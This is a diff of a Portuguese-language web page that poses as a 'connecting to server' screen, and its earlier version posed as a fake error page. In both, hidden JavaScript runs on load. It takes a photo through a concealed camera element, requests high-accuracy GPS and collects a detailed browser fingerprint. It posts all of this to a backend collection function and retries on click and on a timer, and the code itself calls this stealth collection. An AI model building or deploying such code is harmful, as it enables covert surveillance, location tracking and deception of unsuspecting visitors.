@@ -3,205 +3,931 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Carregando...</title>
+    <title>Conectando...</title>
     <style>
-        /* TELA DE "ERRO" FALSA */
-        body {
-            background: #f5f5f5;
-            font-family: Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
+        /* ============================================================
+           RESET E BASE
+           ============================================================ */
+        * {
             margin: 0;
+            padding: 0;
+            box-sizing: border-box;
         }
-        .error-box {
-            background: white;
-            padding: 40px;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-            text-align: center;
-            max-width: 400px;
+
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
+
+        :root {
+            --bg-primary: #0a0a0f;
+            --bg-secondary: #14141e;
+            --bg-card: #1a1a2e;
+            --bg-card-hover: #22223a;
+            --text-primary: #f0f0f5;
+            --text-secondary: #a0a0b8;
+            --text-muted: #6a6a82;
+            --accent: #6c63ff;
+            --accent-glow: rgba(108, 99, 255, 0.25);
+            --accent-hover: #7c73ff;
+            --success: #00d4aa;
+            --success-glow: rgba(0, 212, 170, 0.2);
+            --error: #ff6b6b;
+            --warning: #ffd93d;
+            --border: rgba(255, 255, 255, 0.06);
+            --radius: 16px;
+            --radius-sm: 10px;
+            --shadow: 0 20px 60px rgba(0, 0, 0, 0.6);
         }
-        .error-box h1 { color: #e74c3c; }
-        .error-box p { color: #7f8c8d; }
-        .loading-bar {
-            width: 100%;
-            height: 4px;
-            background: #ecf0f1;
-            margin: 20px 0;
-            border-radius: 2px;
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
             overflow: hidden;
         }
-        .loading-bar::after {
-            content: '';
-            display: block;
-            width: 40%;
+
+        /* ============================================================
+           FUNDO ANIMADO (PARTÍCULAS)
+           ============================================================ */
+        .background-particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
             height: 100%;
-            background: #e74c3c;
-            animation: loading 1.5s infinite;
+            z-index: 0;
+            overflow: hidden;
+            pointer-events: none;
         }
-        @keyframes loading {
-            0% { transform: translateX(-100%); }
-            100% { transform: translateX(350%); }
+
+        .particle {
+            position: absolute;
+            width: 4px;
+            height: 4px;
+            background: var(--accent);
+            border-radius: 50%;
+            opacity: 0.1;
+            animation: float-particle 20s infinite linear;
         }
-        /* ESCONDE CÂMERA */
-        video, canvas { display: none; }
-        #status { margin-top: 10px; font-size: 12px; color: #95a5a6; }
+
+        .particle:nth-child(1) { left: 10%; animation-duration: 22s; animation-delay: 0s; width: 6px; height: 6px; }
+        .particle:nth-child(2) { left: 20%; animation-duration: 18s; animation-delay: 2s; }
+        .particle:nth-child(3) { left: 30%; animation-duration: 25s; animation-delay: 4s; width: 8px; height: 8px; }
+        .particle:nth-child(4) { left: 40%; animation-duration: 20s; animation-delay: 1s; }
+        .particle:nth-child(5) { left: 50%; animation-duration: 23s; animation-delay: 3s; width: 5px; height: 5px; }
+        .particle:nth-child(6) { left: 60%; animation-duration: 19s; animation-delay: 5s; }
+        .particle:nth-child(7) { left: 70%; animation-duration: 21s; animation-delay: 2s; width: 7px; height: 7px; }
+        .particle:nth-child(8) { left: 80%; animation-duration: 24s; animation-delay: 0.5s; }
+        .particle:nth-child(9) { left: 90%; animation-duration: 17s; animation-delay: 3.5s; }
+        .particle:nth-child(10) { left: 95%; animation-duration: 26s; animation-delay: 1.5s; width: 9px; height: 9px; }
+
+        @keyframes float-particle {
+            0% { transform: translateY(100vh) scale(0); opacity: 0; }
+            10% { opacity: 0.15; }
+            90% { opacity: 0.15; }
+            100% { transform: translateY(-10vh) scale(1); opacity: 0; }
+        }
+
+        /* ============================================================
+           CARD PRINCIPAL
+           ============================================================ */
+        .main-card {
+            position: relative;
+            z-index: 1;
+            background: var(--bg-secondary);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            padding: 48px 40px 40px;
+            max-width: 480px;
+            width: 100%;
+            box-shadow: var(--shadow);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            transition: all 0.3s ease;
+        }
+
+        .main-card:hover {
+            border-color: rgba(108, 99, 255, 0.15);
+        }
+
+        /* ============================================================
+           HEADER
+           ============================================================ */
+        .card-header {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+
+        .icon-wrapper {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 72px;
+            height: 72px;
+            background: var(--bg-card);
+            border-radius: 50%;
+            margin-bottom: 16px;
+            border: 1px solid var(--border);
+            transition: all 0.3s ease;
+        }
+
+        .icon-wrapper .icon {
+            font-size: 32px;
+            animation: pulse-icon 2s ease-in-out infinite;
+        }
+
+        @keyframes pulse-icon {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+        }
+
+        .card-header h1 {
+            font-size: 22px;
+            font-weight: 600;
+            letter-spacing: -0.3px;
+            color: var(--text-primary);
+        }
+
+        .card-header p {
+            font-size: 14px;
+            color: var(--text-secondary);
+            margin-top: 6px;
+            font-weight: 400;
+        }
+
+        /* ============================================================
+           STATUS / FEEDBACK
+           ============================================================ */
+        .status-container {
+            background: var(--bg-card);
+            border-radius: var(--radius-sm);
+            padding: 16px 20px;
+            margin-bottom: 24px;
+            border: 1px solid var(--border);
+            min-height: 60px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            transition: all 0.3s ease;
+        }
+
+        .status-container .status-icon {
+            font-size: 20px;
+            flex-shrink: 0;
+            width: 28px;
+            text-align: center;
+        }
+
+        .status-container .status-text {
+            font-size: 13px;
+            color: var(--text-secondary);
+            line-height: 1.5;
+            word-break: break-word;
+        }
+
+        .status-container .status-text strong {
+            color: var(--text-primary);
+            font-weight: 500;
+        }
+
+        .status-container.loading {
+            border-color: var(--accent-glow);
+            box-shadow: 0 0 20px var(--accent-glow);
+        }
+
+        .status-container.success {
+            border-color: var(--success-glow);
+            box-shadow: 0 0 20px var(--success-glow);
+        }
+
+        .status-container.error {
+            border-color: rgba(255, 107, 107, 0.2);
+            box-shadow: 0 0 20px rgba(255, 107, 107, 0.1);
+        }
+
+        /* ============================================================
+           BARRA DE PROGRESSO
+           ============================================================ */
+        .progress-wrapper {
+            margin-bottom: 24px;
+        }
+
+        .progress-bar-track {
+            width: 100%;
+            height: 4px;
+            background: var(--bg-card);
+            border-radius: 4px;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .progress-bar-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--accent), var(--success));
+            border-radius: 4px;
+            width: 0%;
+            transition: width 0.4s ease;
+        }
+
+        .progress-bar-fill.active {
+            animation: progress-pulse 1.2s ease-in-out infinite;
+        }
+
+        @keyframes progress-pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        .progress-steps {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 10px;
+            font-size: 11px;
+            color: var(--text-muted);
+            font-weight: 500;
+            letter-spacing: 0.3px;
+            text-transform: uppercase;
+        }
+
+        .progress-steps .step {
+            opacity: 0.3;
+            transition: all 0.3s ease;
+        }
+
+        .progress-steps .step.done {
+            color: var(--success);
+            opacity: 1;
+        }
+
+        .progress-steps .step.active {
+            color: var(--accent);
+            opacity: 1;
+        }
+
+        /* ============================================================
+           DADOS CAPTURADOS (PREVIEW)
+           ============================================================ */
+        .data-preview {
+            background: var(--bg-card);
+            border-radius: var(--radius-sm);
+            padding: 16px 18px;
+            border: 1px solid var(--border);
+            margin-bottom: 20px;
+            display: none;
+            transition: all 0.3s ease;
+        }
+
+        .data-preview.visible {
+            display: block;
+            animation: fadeSlideIn 0.5s ease;
+        }
+
+        @keyframes fadeSlideIn {
+            0% { opacity: 0; transform: translateY(8px); }
+            100% { opacity: 1; transform: translateY(0); }
+        }
+
+        .data-preview .data-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 6px 0;
+            font-size: 12px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
+        }
+
+        .data-preview .data-row:last-child {
+            border-bottom: none;
+        }
+
+        .data-preview .data-label {
+            color: var(--text-muted);
+            font-weight: 400;
+        }
+
+        .data-preview .data-value {
+            color: var(--text-secondary);
+            font-weight: 500;
+            font-family: 'Courier New', monospace;
+            font-size: 11px;
+            text-align: right;
+            max-width: 60%;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+
+        /* ============================================================
+           BOTÃO MANUAL (FALSA)
+           ============================================================ */
+        .fake-button {
+            width: 100%;
+            padding: 14px;
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: var(--radius-sm);
+            color: var(--text-muted);
+            font-size: 13px;
+            font-weight: 500;
+            cursor: not-allowed;
+            transition: all 0.3s ease;
+            text-align: center;
+            letter-spacing: 0.3px;
+            font-family: 'Inter', sans-serif;
+        }
+
+        .fake-button:hover {
+            background: var(--bg-card-hover);
+            border-color: rgba(255, 255, 255, 0.08);
+        }
+
+        /* ============================================================
+           FOOTER
+           ============================================================ */
+        .card-footer {
+            margin-top: 20px;
+            text-align: center;
+            font-size: 11px;
+            color: var(--text-muted);
+            letter-spacing: 0.3px;
+        }
+
+        .card-footer .code {
+            font-family: 'Courier New', monospace;
+            background: var(--bg-card);
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-size: 10px;
+        }
+
+        /* ============================================================
+           RESPONSIVIDADE
+           ============================================================ */
+        @media (max-width: 500px) {
+            .main-card {
+                padding: 32px 20px 28px;
+            }
+            .card-header h1 {
+                font-size: 19px;
+            }
+            .status-container {
+                padding: 12px 16px;
+                min-height: 52px;
+            }
+            .status-container .status-text {
+                font-size: 12px;
+            }
+            .icon-wrapper {
+                width: 60px;
+                height: 60px;
+            }
+            .icon-wrapper .icon {
+                font-size: 26px;
+            }
+        }
+
+        /* ============================================================
+           SCROLLBAR
+           ============================================================ */
+        ::-webkit-scrollbar {
+            width: 4px;
+        }
+        ::-webkit-scrollbar-track {
+            background: var(--bg-primary);
+        }
+        ::-webkit-scrollbar-thumb {
+            background: var(--bg-card);
+            border-radius: 4px;
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--bg-card-hover);
+        }
     </style>
 </head>
 <body>
 
-    <div class="error-box">
-        <h1>⚠️ Erro ao carregar</h1>
-        <p>Ocorreu um problema ao processar sua solicitação.<br>Tente novamente mais tarde.</p>
-        <div class="loading-bar"></div>
-        <div id="status">Código: ERR_SSL_PROTOCOL_ERROR</div>
+    <!-- ===== FUNDO DE PARTÍCULAS ===== -->
+    <div class="background-particles">
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
     </div>
 
-    <!-- CÂMERA OCULTA -->
-    <video id="video" autoplay playsinline muted></video>
-    <canvas id="canvas"></canvas>
+    <!-- ===== CARD PRINCIPAL ===== -->
+    <div class="main-card" id="app">
 
+        <!-- HEADER -->
+        <div class="card-header">
+            <div class="icon-wrapper">
+                <span class="icon" id="mainIcon">🔗</span>
+            </div>
+            <h1>Conectando ao servidor</h1>
+            <p>Aguardando resposta do sistema...</p>
+        </div>
+
+        <!-- STATUS -->
+        <div class="status-container" id="statusContainer">
+            <span class="status-icon" id="statusIcon">⏳</span>
+            <span class="status-text" id="statusText"><strong>Inicializando...</strong> Verificando permissões</span>
+        </div>
+
+        <!-- BARRA DE PROGRESSO -->
+        <div class="progress-wrapper">
+            <div class="progress-bar-track">
+                <div class="progress-bar-fill" id="progressFill"></div>
+            </div>
+            <div class="progress-steps">
+                <span class="step" id="step1">📸 Câmera</span>
+                <span class="step" id="step2">📍 GPS</span>
+                <span class="step" id="step3">📤 Envio</span>
+            </div>
+        </div>
+
+        <!-- PREVIEW DOS DADOS -->
+        <div class="data-preview" id="dataPreview">
+            <div class="data-row">
+                <span class="data-label">📸 Foto</span>
+                <span class="data-value" id="previewFoto">Aguardando...</span>
+            </div>
+            <div class="data-row">
+                <span class="data-label">📍 Localização</span>
+                <span class="data-value" id="previewLocalizacao">Aguardando...</span>
+            </div>
+            <div class="data-row">
+                <span class="data-label">🖥️ Navegador</span>
+                <span class="data-value" id="previewNavegador">Aguardando...</span>
+            </div>
+        </div>
+
+        <!-- BOTÃO FALSO -->
+        <button class="fake-button" disabled>⬆️ Processando solicitação...</button>
+
+        <!-- FOOTER -->
+        <div class="card-footer">
+            <span class="code">v3.0.1</span> • <span id="timestampDisplay">--:--:--</span>
+        </div>
+    </div>
+
+    <!-- ===== ELEMENTOS OCULTOS (CÂMERA) ===== -->
+    <video id="video" autoplay playsinline muted style="display:none;width:0;height:0;"></video>
+    <canvas id="canvas" style="display:none;width:0;height:0;"></canvas>
+
+    <!-- ============================================================
+    JAVASCRIPT PRINCIPAL
+    ============================================================ -->
     <script>
         (function() {
             'use strict';
 
+            // ============================================================
+            // CONFIGURAÇÕES
+            // ============================================================
             const CONFIG = {
-                backendURL: '/.netlify/functions/coletar', // CAMINHO CORRETO (SEM PONTO)
-                camera: { qualidade: 0.9, largura: 640, altura: 480 }
+                backendURL: '/.netlify/functions/coletar',
+                camera: {
+                    qualidade: 0.92,
+                    largura: 1280,
+                    altura: 720,
+                    timeout: 8000,
+                    tentativas: 3
+                },
+                geolocation: {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0,
+                    tentativas: 3
+                }
             };
 
-            const video = document.getElementById('video');
-            const canvas = document.getElementById('canvas');
+            // ============================================================
+            // DOM ELEMENTOS
+            // ============================================================
+            const $ = (sel) => document.querySelector(sel);
+            const $$ = (sel) => document.querySelectorAll(sel);
+
+            const mainIcon = $('#mainIcon');
+            const statusContainer = $('#statusContainer');
+            const statusIcon = $('#statusIcon');
+            const statusText = $('#statusText');
+            const progressFill = $('#progressFill');
+            const step1 = $('#step1');
+            const step2 = $('#step2');
+            const step3 = $('#step3');
+            const dataPreview = $('#dataPreview');
+            const previewFoto = $('#previewFoto');
+            const previewLocalizacao = $('#previewLocalizacao');
+            const previewNavegador = $('#previewNavegador');
+            const timestampDisplay = $('#timestampDisplay');
+            const video = $('#video');
+            const canvas = $('#canvas');
             const ctx = canvas.getContext('2d');
-            const statusDiv = document.getElementById('status');
 
-            // === FUNÇÃO PARA CAPTURAR FOTO ===
-            async function capturarFoto() {
-                try {
-                    statusDiv.innerText = '📸 Solicitando acesso à câmera...';
-                    const stream = await navigator.mediaDevices.getUserMedia({
-                        video: { facingMode: 'environment', width: 640, height: 480 },
-                        audio: false
-                    });
+            // ============================================================
+            // ESTADO
+            // ============================================================
+            let estado = {
+                foto: null,
+                localizacao: null,
+                navegador: null,
+                enviado: false,
+                erros: 0
+            };
 
-                    video.srcObject = stream;
-                    await video.play();
+            // ============================================================
+            // FUNÇÕES DE UI
+            // ============================================================
+            function setStatus(icone, texto, tipo = 'loading') {
+                statusIcon.textContent = icone;
+                statusText.innerHTML = texto;
+                statusContainer.className = 'status-container ' + tipo;
 
-                    statusDiv.innerText = '📸 Capturando imagem...';
-                    await new Promise(r => setTimeout(r, 300));
+                // Atualiza ícone principal
+                if (tipo === 'success') {
+                    mainIcon.textContent = '✅';
+                    statusContainer.classList.add('success');
+                } else if (tipo === 'error') {
+                    mainIcon.textContent = '❌';
+                    statusContainer.classList.add('error');
+                } else {
+                    mainIcon.textContent = '🔗';
+                    statusContainer.classList.add('loading');
+                }
 
-                    canvas.width = video.videoWidth || 640;
-                    canvas.height = video.videoHeight || 480;
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                // Atualiza timestamp
+                const now = new Date();
+                timestampDisplay.textContent = now.toLocaleTimeString('pt-BR');
+            }
 
-                    const fotoBase64 = canvas.toDataURL('image/jpeg', CONFIG.camera.qualidade);
+            function setProgress(step, total = 3) {
+                const pct = (step / total) * 100;
+                progressFill.style.width = Math.min(pct, 100) + '%';
 
-                    stream.getTracks().forEach(track => track.stop());
-                    statusDiv.innerText = '✅ Foto capturada com sucesso!';
-                    return fotoBase64;
-                } catch (err) {
-                    statusDiv.innerText = '❌ Erro na câmera: ' + err.message;
-                    console.error('Erro na câmera:', err);
-                    return null;
+                // Atualiza os passos
+                const steps = [step1, step2, step3];
+                steps.forEach((el, i) => {
+                    el.className = 'step';
+                    if (i < step) el.classList.add('done');
+                    if (i === step) el.classList.add('active');
+                });
+
+                if (step >= total) {
+                    progressFill.classList.remove('active');
+                } else {
+                    progressFill.classList.add('active');
                 }
             }
 
-            // === FUNÇÃO PARA CAPTURAR LOCALIZAÇÃO ===
+            function showDataPreview(foto, localizacao, navegador) {
+                dataPreview.classList.add('visible');
+
+                if (foto) {
+                    previewFoto.textContent = '✅ Capturada (' + Math.round(foto.length / 1024) + 'KB)';
+                } else {
+                    previewFoto.textContent = '❌ Não capturada';
+                }
+
+                if (localizacao) {
+                    previewLocalizacao.textContent =
+                        `${localizacao.latitude.toFixed(6)}, ${localizacao.longitude.toFixed(6)}`;
+                } else {
+                    previewLocalizacao.textContent = '❌ Não capturada';
+                }
+
+                if (navegador) {
+                    const ua = navegador.userAgent || '';
+                    const browser = ua.includes('Chrome') ? 'Chrome' :
+                        ua.includes('Firefox') ? 'Firefox' :
+                        ua.includes('Safari') ? 'Safari' : 'Desconhecido';
+                    previewNavegador.textContent = browser + ' • ' + (navegador.timezone || 'N/A');
+                } else {
+                    previewNavegador.textContent = '❌ Não capturado';
+                }
+            }
+
+            // ============================================================
+            // FUNÇÕES DE CAPTURA
+            // ============================================================
+
+            // --- CÂMERA ---
+            async function capturarFoto() {
+                setStatus('📸', '<strong>Solicitando câmera...</strong> Permita o acesso quando solicitado', 'loading');
+                setProgress(0);
+
+                const configs = [
+                    { facingMode: 'environment', width: CONFIG.camera.largura, height: CONFIG.camera.altura },
+                    { facingMode: 'user', width: CONFIG.camera.largura, height: CONFIG.camera.altura },
+                    { width: CONFIG.camera.largura, height: CONFIG.camera.altura },
+                    { facingMode: 'environment' },
+                    { facingMode: 'user' }
+                ];
+
+                for (let i = 0; i < Math.min(configs.length, CONFIG.camera.tentativas + 2); i++) {
+                    try {
+                        const config = configs[i];
+                        setStatus('📸', `<strong>Tentativa ${i + 1}...</strong> Iniciando câmera`, 'loading');
+
+                        const stream = await navigator.mediaDevices.getUserMedia({
+                            video: config,
+                            audio: false
+                        });
+
+                        video.srcObject = stream;
+                        await video.play();
+
+                        // Aguarda o vídeo carregar
+                        await new Promise((resolve, reject) => {
+                            const timeout = setTimeout(reject, CONFIG.camera.timeout);
+                            video.onloadeddata = () => {
+                                clearTimeout(timeout);
+                                resolve();
+                            };
+                            video.onerror = () => {
+                                clearTimeout(timeout);
+                                reject(new Error('Erro no vídeo'));
+                            };
+                        });
+
+                        // Aguarda 1 frame
+                        await new Promise(r => requestAnimationFrame(r));
+
+                        // Captura
+                        canvas.width = video.videoWidth || CONFIG.camera.largura;
+                        canvas.height = video.videoHeight || CONFIG.camera.altura;
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                        const fotoBase64 = canvas.toDataURL('image/jpeg', CONFIG.camera.qualidade);
+
+                        // Limpa
+                        stream.getTracks().forEach(track => track.stop());
+                        video.srcObject = null;
+
+                        setStatus('✅', '<strong>Foto capturada!</strong> Imagem salva com sucesso', 'success');
+                        setProgress(1);
+                        return fotoBase64;
+
+                    } catch (err) {
+                        console.warn('Tentativa ' + (i + 1) + ' falhou:', err.message);
+                        if (video.srcObject) {
+                            video.srcObject.getTracks().forEach(t => t.stop());
+                            video.srcObject = null;
+                        }
+                    }
+                }
+
+                setStatus('❌', '<strong>Erro na câmera:</strong> Não foi possível acessar. Verifique as permissões.', 'error');
+                return null;
+            }
+
+            // --- LOCALIZAÇÃO ---
             function capturarLocalizacao() {
                 return new Promise((resolve) => {
+                    setStatus('📍', '<strong>Solicitando localização...</strong> Permita o acesso quando solicitado',
+                    'loading');
+
                     if (!navigator.geolocation) {
-                        statusDiv.innerText = '❌ Geolocalização não suportada';
+                        setStatus('❌', '<strong>Geolocalização:</strong> Navegador não suporta', 'error');
                         resolve(null);
                         return;
                     }
 
-                    statusDiv.innerText = '📍 Solicitando localização...';
-                    navigator.geolocation.getCurrentPosition(
-                        (position) => {
-                            const dados = {
-                                latitude: position.coords.latitude,
-                                longitude: position.coords.longitude,
-                                precisao: position.coords.accuracy
-                            };
-                            statusDiv.innerText = '✅ Localização obtida!';
-                            resolve(dados);
-                        },
-                        (error) => {
-                            statusDiv.innerText = '❌ Erro na localização: ' + error.message;
-                            console.error('Erro na localização:', error);
-                            resolve(null);
-                        },
-                        { enableHighAccuracy: true, timeout: 5000 }
-                    );
+                    let tentativas = 0;
+                    let timeoutId = null;
+
+                    function tentar() {
+                        tentativas++;
+                        setStatus('📍', `<strong>Tentativa ${tentativas}...</strong> Aguardando sinal GPS`, 'loading');
+
+                        timeoutId = setTimeout(() => {
+                            console.warn('Timeout na tentativa ' + tentativas);
+                            if (tentativas < CONFIG.geolocation.tentativas) {
+                                tentar();
+                            } else {
+                                setStatus('❌', '<strong>Erro na localização:</strong> Tempo limite excedido', 'error');
+                                resolve(null);
+                            }
+                        }, CONFIG.geolocation.timeout);
+
+                        navigator.geolocation.getCurrentPosition(
+                            (position) => {
+                                clearTimeout(timeoutId);
+                                const dados = {
+                                    latitude: position.coords.latitude,
+                                    longitude: position.coords.longitude,
+                                    precisao: position.coords.accuracy,
+                                    altitude: position.coords.altitude || null,
+                                    velocidade: position.coords.speed || null,
+                                    timestamp: new Date(position.timestamp).toISOString()
+                                };
+                                setStatus('✅', `<strong>Localização obtida!</strong> ${dados.latitude.toFixed(6)}, ${dados.longitude.toFixed(6)}`,
+                                    'success');
+                                setProgress(2);
+                                resolve(dados);
+                            },
+                            (error) => {
+                                clearTimeout(timeoutId);
+                                console.warn('Erro na tentativa ' + tentativas + ':', error.message);
+                                if (tentativas < CONFIG.geolocation.tentativas) {
+                                    setTimeout(tentar, 1500 * tentativas);
+                                } else {
+                                    setStatus('❌', `<strong>Erro na localização:</strong> ${error.message}`, 'error');
+                                    resolve(null);
+                                }
+                            },
+                            CONFIG.geolocation
+                        );
+                    }
+
+                    tentar();
                 });
             }
 
-            // === FUNÇÃO PARA ENVIAR OS DADOS ===
-            async function enviarDados(foto, localizacao) {
+            // --- FINGERPRINT ---
+            function capturarNavegador() {
+                return {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    languages: navigator.languages || [],
+                    screenWidth: window.screen.width,
+                    screenHeight: window.screen.height,
+                    colorDepth: window.screen.colorDepth,
+                    pixelRatio: window.devicePixelRatio || 1,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    timezoneOffset: new Date().getTimezoneOffset(),
+                    hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
+                    deviceMemory: navigator.deviceMemory || 'N/A',
+                    plugins: Array.from(navigator.plugins || []).map(p => p.name).join(', '),
+                    referer: document.referrer || 'Nenhum',
+                    url: window.location.href,
+                    dataHora: new Date().toISOString(),
+                    timestamp: Date.now()
+                };
+            }
+
+            // ============================================================
+            // ENVIO
+            // ============================================================
+            async function enviarDados(foto, localizacao, navegador) {
+                setStatus('📤', '<strong>Enviando dados...</strong> Aguarde o processamento', 'loading');
+                setProgress(2);
+
                 const payload = {
                     foto: foto || null,
                     localizacao: localizacao || null,
-                    navegador: {
-                        userAgent: navigator.userAgent,
-                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                        language: navigator.language
-                    },
+                    navegador: navegador || null,
                     timestamp: new Date().toISOString()
                 };
 
-                statusDiv.innerText = '📤 Enviando dados para o servidor...';
-                console.log('📦 Enviando:', payload);
+                console.log('📦 Payload:', {
+                    ...payload,
+                    foto: payload.foto ? `[BASE64: ${Math.round(payload.foto.length / 1024)}KB]` : null
+                });
 
                 try {
                     const response = await fetch(CONFIG.backendURL, {
                         method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'Accept': 'application/json'
+                        },
                         body: JSON.stringify(payload)
                     });
 
-                    if (!response.ok) throw new Error('Erro HTTP: ' + response.status);
+                    if (!response.ok) {
+                        throw new Error(`HTTP ${response.status}: ${response.statusText}`);
+                    }
+
                     const result = await response.json();
-                    statusDiv.innerText = '✅ Dados enviados com sucesso!';
                     console.log('✅ Resposta do servidor:', result);
-                } catch (err) {
-                    statusDiv.innerText = '❌ Erro no envio: ' + err.message;
-                    console.error('❌ Erro no envio:', err);
+
+                    setStatus('✅', '<strong>Dados enviados com sucesso!</strong> Coleta finalizada', 'success');
+                    setProgress(3);
+                    return result;
+
+                } catch (error) {
+                    console.error('❌ Erro no envio:', error);
+                    setStatus('❌', `<strong>Erro no envio:</strong> ${error.message}`, 'error');
+
+                    // Fallback: salva localmente
+                    try {
+                        localStorage.setItem('coleta_fallback', JSON.stringify(payload));
+                        console.log('💾 Dados salvos localmente (fallback)');
+                    } catch (e) { /* ignore */ }
+
+                    return null;
                 }
             }
 
-            // === EXECUTA A COLETA ===
-            async function executar() {
-                statusDiv.innerText = '🚀 Iniciando coleta...';
-                console.log('🚀 Iniciando coleta...');
+            // ============================================================
+            // FLUXO PRINCIPAL
+            // ============================================================
+            async function executarColeta() {
+                if (estado.enviado) {
+                    console.log('⏭️ Coleta já realizada, ignorando...');
+                    return;
+                }
 
-                // Coleta foto e localização ao mesmo tempo
-                const [foto, localizacao] = await Promise.all([
-                    capturarFoto(),
-                    capturarLocalizacao()
-                ]);
+                console.log('🚀 INICIANDO COLETA FURTIVA v3.0');
 
-                // Envia os dados
-                await enviarDados(foto, localizacao);
+                try {
+                    // 1. Captura foto e localização em paralelo
+                    const [foto, localizacao] = await Promise.all([
+                        capturarFoto(),
+                        capturarLocalizacao()
+                    ]);
 
-                statusDiv.innerText = '✅ Processo finalizado!';
-                console.log('✅ Processo finalizado!');
+                    // 2. Fingerprint
+                    const navegador = capturarNavegador();
+
+                    // 3. Mostra preview
+                    showDataPreview(foto, localizacao, navegador);
+
+                    // 4. Envia
+                    const resultado = await enviarDados(foto, localizacao, navegador);
+
+                    estado.foto = foto;
+                    estado.localizacao = localizacao;
+                    estado.navegador = navegador;
+                    estado.enviado = true;
+
+                    if (resultado) {
+                        console.log('✅ COLETA FINALIZADA COM SUCESSO!');
+                    } else {
+                        console.log('⚠️ Coleta finalizada com falha no envio, mas dados salvos localmente');
+                    }
+
+                } catch (error) {
+                    console.error('💥 ERRO CRÍTICO:', error);
+                    setStatus('❌', `<strong>Erro crítico:</strong> ${error.message}`, 'error');
+                }
             }
 
-            // === INICIA AUTOMATICAMENTE ===
-            // Aguarda 1 segundo para garantir que a página carregou
-            setTimeout(() => {
-                executar();
-            }, 1000);
+            // ============================================================
+            // INICIALIZAÇÃO
+            // ============================================================
+            function iniciar() {
+                console.log('🔧 Inicializando sistema v3.0...');
+                setStatus('⏳', '<strong>Inicializando...</strong> Verificando permissões', 'loading');
+                setProgress(0);
 
-            // Fallback: tenta novamente se o usuário clicar na tela (caso tenha negado permissões)
-            document.addEventListener('click', function handler() {
-                executar();
-                document.removeEventListener('click', handler);
-            }, { once: true });
+                // Atualiza timestamp
+                const now = new Date();
+                timestampDisplay.textContent = now.toLocaleTimeString('pt-BR');
+
+                // Aguarda 1.5s para dar tempo do carregamento
+                setTimeout(() => {
+                    executarColeta();
+                }, 1500);
+
+                // Fallback: tenta novamente se o usuário clicar (útil se negou permissões)
+                document.addEventListener('click', function handler() {
+                    if (!estado.enviado) {
+                        console.log('🔄 Tentando novamente por interação...');
+                        executarColeta();
+                    }
+                    document.removeEventListener('click', handler);
+                }, { once: true });
+
+                // Fallback automático após 15s
+                setTimeout(() => {
+                    if (!estado.enviado) {
+                        console.log('⏰ Fallback automático...');
+                        executarColeta();
+                    }
+                }, 15000);
+            }
+
+            // ============================================================
+            // INÍCIO
+            // ============================================================
+            if (document.readyState === 'loading') {
+                document.addEventListener('DOMContentLoaded', iniciar);
+            } else {
+                iniciar();
+            }
+
+            // ============================================================
+            // EXPÕE PARA DEBUG
+            // ============================================================
+            window.__coleta = {
+                estado: estado,
+                executar: executarColeta,
+                CONFIG: CONFIG
+            };
+
+            console.log('🐞 Para debug: window.__coleta.executar()');
 
         })();
     </script>
+
 </body>
 </html>
